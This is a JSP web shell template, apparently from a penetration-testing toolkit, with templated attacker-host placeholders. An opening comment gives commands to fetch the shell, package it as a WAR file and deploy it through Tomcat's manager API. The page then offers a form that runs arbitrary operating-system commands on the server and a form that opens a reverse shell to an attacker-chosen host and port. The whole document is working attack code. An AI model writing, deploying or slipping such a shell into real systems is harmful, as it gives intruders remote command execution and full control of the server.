<!--
    For tomcat web application manager:
        mkdir webshell
        curl {{datastore.srvhost_url}}/shells/shell.jsp > webshell/index.jsp
        jar -cvf webshell.war -C webshell .
    Navigate to the tomcat manager and select the WAR file to upload and select deploy, or with the text API:
        curl --upload-file ./webshell.war "http://10.10.10.10:8080/manager/text/deploy?path=/webshell&update=true" -u 'user:pass'
-->

<h2>Arbitrary commands</h2>
<form method='GET'>
    <textarea name='cmd' style='width: 100%' type='text'><%= request.getParameter("cmd") == null ? "" : request.getParameter("cmd") %></textarea>
    <br />
    <input type='submit' value='Run'>
</form>
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) {
                output += s + "</br>";
            }
        }  catch(IOException e) {
            e.printStackTrace();
        }
    }
%>
<pre><%= output %></pre>

<h2>Reverse shell</h2>
<form method='GET'>
    <strong>rhost</strong>
    <textarea name='rhost' style='width: 100%' type='text'><%= request.getParameter("rhost") == null ? "{{datastore.lhost}}" : request.getParameter("rhost") %></textarea>
    <br />
    <strong>rport</strong>
    <textarea name='rport' style='width: 100%' type='text'><%= request.getParameter("rport") == null ? "{{datastore.lport}}" : request.getParameter("rport") %></textarea>
    <br />
    <strong>process</strong>
    <textarea name='process' style='width: 100%' type='text'><%= request.getParameter("process") == null ? "cmd.exe" : request.getParameter("process") %></textarea>
    <br />
    <input type='submit' value='run'>
</form>
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%
    final String process = request.getParameter("process");
    try {
        if (process != null) {
            final String rhost = request.getParameter("rhost");
            final int rport = Integer.parseInt(request.getParameter("rport"));
            // Thread thread = new Thread(){
                //public void run(){
                    List commandAndArguments = new ArrayList();
                    commandAndArguments.add(process);
                    Process p = new ProcessBuilder(commandAndArguments).redirectErrorStream(true).start();
                    Socket s = new Socket(rhost, rport);
                    InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
                    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
                    while (!s.isClosed()) {
                        while (pi.available() > 0) so.write(pi.read());
                        while (pe.available() > 0) so.write(pe.read());
                        while (si.available() > 0) po.write(si.read());
                        so.flush();
                        po.flush();
                        Thread.sleep(50);
                        try {
                            p.exitValue();
                            break;
                        } catch (Exception e) {}
                    };
                    p.destroy();
                    s.close();
                //}
            // };

            //thread.start();
        }
    } catch (Exception e) {
        System.out.println("failed");
    }
%>
